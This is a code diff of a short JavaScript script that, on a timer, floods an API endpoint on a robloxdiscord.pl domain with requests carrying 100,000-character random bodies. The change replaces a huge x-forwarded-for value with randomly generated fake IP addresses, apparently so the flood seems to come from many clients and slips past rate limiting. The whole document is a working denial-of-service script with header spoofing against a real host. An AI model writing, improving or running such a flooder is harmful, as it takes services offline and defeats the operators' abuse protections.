@@ -16,6 +16,16 @@ function makeid(length) {
     }
     return result;
     }
+function makeidz(length) {
+        var result           = '';
+        var characters       = '1234567890';
+        var charactersLength = characters.length;
+        for ( var i = 0; i < length; i++ ) {
+        result += characters.charAt(Math.floor(Math.random() * 
+    charactersLength));
+    }
+    return result;
+    }
     setInterval(()=>{
         fetch("https://api-bytow.robloxdiscord.pl/egg", {
             "credentials": "omit",
@@ -27,7 +37,7 @@ function makeid(length) {
                 "Sec-Fetch-Dest": "empty",
                 "Sec-Fetch-Mode": "cors",
                 "Sec-Fetch-Site": "same-site",
-                "x-forwarded-for": makeid(10000)
+                "x-forwarded-for": `${makeidz(2)}.${makeidz(2)}.${makeidz(2)}.${makeidz(2)}.`
             },
             "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
             "body": "num1="+makeid(100000)+"&captcha=",
